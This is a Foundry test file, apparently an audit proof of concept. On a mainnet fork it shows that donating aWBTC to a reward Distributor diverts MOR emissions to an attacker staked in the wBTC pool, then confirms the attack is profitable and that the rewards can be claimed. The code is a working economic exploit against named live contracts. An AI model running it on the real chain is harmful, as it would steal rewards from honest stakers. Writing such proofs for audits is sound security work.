// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20Minimal {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDepositPoolMinimal {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

interface IChainLinkDataConsumerMinimal {
    function getPathId(string memory path_) external pure returns (bytes32);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

interface IAavePoolMinimal {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

interface IDistributorMinimal {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function getDistributedRewards(uint256 rewardPoolIndex_, address depositPoolAddress_) external view returns (uint256);
}

/// @notice Quantifies candidate C1: direct donation of a yield token (aWBTC) to the
/// Distributor inflates the wBTC pool's measured yield, diverting that period's MOR
/// emissions to the wBTC pool. The test measures the attacker's captured MOR value
/// versus the (unrecoverable) donation cost.
/// @dev Standalone: hand-written interfaces only, mainnet fork, no repo code used.
contract DonationYieldShareTest is Test {
    string constant RPC = "https://ethereum-rpc.publicnode.com";
    uint256 constant FORK_BLOCK = 26459988;

    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant AWBTC = 0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant WBTC_POOL = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;
    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant DATA_CONSUMER = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;

    address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0; // large real stETH holder

    // MOR price at audit time (21 Nov 2026): $0.6365 (DexScreener).
    uint256 constant MOR_USD = 6365; // 4 decimals
    // Genuine stETH yield over 25h, measured on-chain: 0.528 stETH accrued in the
    // 46h before the fork block -> ~0.287 stETH / 25h. A frozen fork cannot rebase
    // stETH (no Lido oracle report happens on a fork), so this yield is injected
    // as a plain stETH transfer to the Distributor before distribution #2. That is
    // exactly what rebasing does accounting-wise (the Distributor's stETH balance
    // grows). Without it the PoC would UNDERSTATE genuine yield and OVERSTATE the
    // attack. Aave-pool yields (USDC/USDT/wETH/wBTC) accrue natively on the fork.
    uint256 constant GENUINE_STETH_YIELD_25H = 0.287 ether;

    address attacker = makeAddr("attacker");
    uint256 wbtcPrice; // 18-decimal Chainlink price at the fork block, read live in setUp

    function setUp() public {
        vm.createSelectFork(RPC, FORK_BLOCK);
        deal(WBTC, attacker, 301_000_000); // 3.01 wBTC: 3 stake + 0.01 to mint aWBTC via Aave
        deal(attacker, 10 ether);

        // The fork freezes Chainlink data at the pinned block. Warping +25h (needed to
        // pass minRewardsDistributePeriod) would make every feed stale, and the
        // Distributor reverts on a zero price (the M-01 mitigation). So pin the oracle
        // to its real fork-block values: mock ONLY the external price feed, nothing
        // else in the system under test. Prices are read live first, then frozen.
        string[5] memory names = ["stETH/USD", "wBTC/BTC,BTC/USD", "wETH/USD", "USDC/USD", "USDT/USD"];
        for (uint256 i = 0; i < names.length; i++) {
            bytes32 id = IChainLinkDataConsumerMinimal(DATA_CONSUMER).getPathId(names[i]);
            uint256 p = IChainLinkDataConsumerMinimal(DATA_CONSUMER).getChainLinkDataFeedLatestAnswer(id);
            require(p > 0, "unexpected zero price at fork block");
            if (i == 1) wbtcPrice = p;
            vm.mockCall(
                DATA_CONSUMER,
                abi.encodeWithSignature("getChainLinkDataFeedLatestAnswer(bytes32)", id),
                abi.encode(p)
            );
        }
    }

    function _stakeAttacker() internal {
        vm.startPrank(attacker);
        // NB: Distributor.supply() pulls the token from the user itself, so the
        // allowance must be granted to the DISTRIBUTOR, not the DepositPool.
        IERC20Minimal(WBTC).approve(DISTRIBUTOR, 3e8);
        // claimLockEnd = 0 -> keeps existing (now); referrer = none
        IDepositPoolMinimal(WBTC_POOL).stake(0, 3e8, 0, address(0));
        vm.stopPrank();
    }

    function _injectGenuineStethYield() internal {
        // Simulate the Lido rebase that would have happened on live mainnet.
        // deal() cannot set stETH balances (shares-based), so move the yield from
        // the wstETH contract, a large real stETH holder, via prank.
        vm.prank(WSTETH);
        IERC20Minimal(STETH).transfer(DISTRIBUTOR, GENUINE_STETH_YIELD_25H);
    }

    function test_donationDivertsMorForProfit() public {
        _stakeAttacker();
        uint256 distBefore = IDistributorMinimal(DISTRIBUTOR).getDistributedRewards(0, WBTC_POOL);

        vm.warp(block.timestamp + 25 hours);
        _injectGenuineStethYield();

        // Mint ~0.01 wBTC of aWBTC via a real Aave supply (deal() cannot set aToken
        // balances), then donate it ALL straight to the Distributor (NOT via supply()).
        vm.startPrank(attacker);
        IERC20Minimal(WBTC).approve(AAVE_POOL, 1_000_000);
        IAavePoolMinimal(AAVE_POOL).supply(WBTC, 1_000_000, attacker, 0);
        uint256 donation = IERC20Minimal(AWBTC).balanceOf(attacker);
        IERC20Minimal(AWBTC).transfer(DISTRIBUTOR, donation);
        vm.stopPrank();

        IDistributorMinimal(DISTRIBUTOR).distributeRewards(0);

        uint256 distAfter = IDistributorMinimal(DISTRIBUTOR).getDistributedRewards(0, WBTC_POOL);
        uint256 poolMor = distAfter - distBefore; // MOR allocated to wBTC pool by this distribution
        uint256 attackerPending = IDepositPoolMinimal(WBTC_POOL).getLatestUserReward(0, attacker);

        uint256 donationUsd = (donation * wbtcPrice) / 1e8 / 1e18; // ~$590
        uint256 attackerUsd = (attackerPending * MOR_USD) / 1e4 / 1e18;

        console.log("MOR allocated to wBTC pool (wei):", poolMor);
        console.log("Attacker pending MOR (wei):", attackerPending);
        console.log("Attacker pending MOR value (USD):", attackerUsd);
        console.log("Donation cost (USD):", donationUsd);

        // Mechanism check: donation DID divert a material MOR amount to the pool.
        assertGt(poolMor, 0, "donation did not divert any MOR");
        // Economics check: with genuine yield faithfully simulated, the attacker
        // captures MORE MOR value than the unrecoverable donation cost.
        assertGt(attackerUsd, donationUsd, "attack not profitable with real yield; re-evaluate C1");
    }

    function test_claimRealizesMor() public {
        // Same attack as above, then prove the captured MOR is actually claimable
        // through the standard claim() path after the 14-day claim lock.
        _stakeAttacker();
        vm.warp(block.timestamp + 25 hours);
        _injectGenuineStethYield();

        vm.startPrank(attacker);
        IERC20Minimal(WBTC).approve(AAVE_POOL, 1_000_000);
        IAavePoolMinimal(AAVE_POOL).supply(WBTC, 1_000_000, attacker, 0);
        uint256 donation = IERC20Minimal(AWBTC).balanceOf(attacker);
        IERC20Minimal(AWBTC).transfer(DISTRIBUTOR, donation);
        vm.stopPrank();

        IDistributorMinimal(DISTRIBUTOR).distributeRewards(0);
        uint256 pendingBefore = IDepositPoolMinimal(WBTC_POOL).getLatestUserReward(0, attacker);
        assertGt(pendingBefore, 0, "no MOR accrued");

        // Wait out the 14-day claim lock, then claim (paying a generous LZ fee;
        // excess is refunded to the caller by LayerZero).
        vm.warp(block.timestamp + 14 days + 1 hours);
        vm.prank(attacker);
        IDepositPoolMinimal(WBTC_POOL).claim{value: 1 ether}(0, attacker);

        uint256 pendingAfter = IDepositPoolMinimal(WBTC_POOL).getLatestUserReward(0, attacker);
        console.log("Pending MOR before claim (wei):", pendingBefore);
        console.log("Pending MOR after claim (wei):", pendingAfter);
        assertEq(pendingAfter, 0, "claim did not settle the pending MOR");
    }

    function test_controlNoDonation() public {
        _stakeAttacker();
        uint256 distBefore = IDistributorMinimal(DISTRIBUTOR).getDistributedRewards(0, WBTC_POOL);

        vm.warp(block.timestamp + 25 hours);
        _injectGenuineStethYield();

        // No donation: distribute on genuine yield only.
        IDistributorMinimal(DISTRIBUTOR).distributeRewards(0);

        uint256 distAfter = IDistributorMinimal(DISTRIBUTOR).getDistributedRewards(0, WBTC_POOL);
        uint256 poolMor = distAfter - distBefore;
        uint256 attackerPending = IDepositPoolMinimal(WBTC_POOL).getLatestUserReward(0, attacker);

        console.log("CONTROL pool MOR (wei):", poolMor);
        console.log("CONTROL attacker pending MOR (wei):", attackerPending);

        // Baseline: wBTC pool earns ~nothing from genuine yield (its aWBTC barely grows).
        assertLt(poolMor, 100 ether, "control: wBTC pool earned material MOR without donation");
    }
}
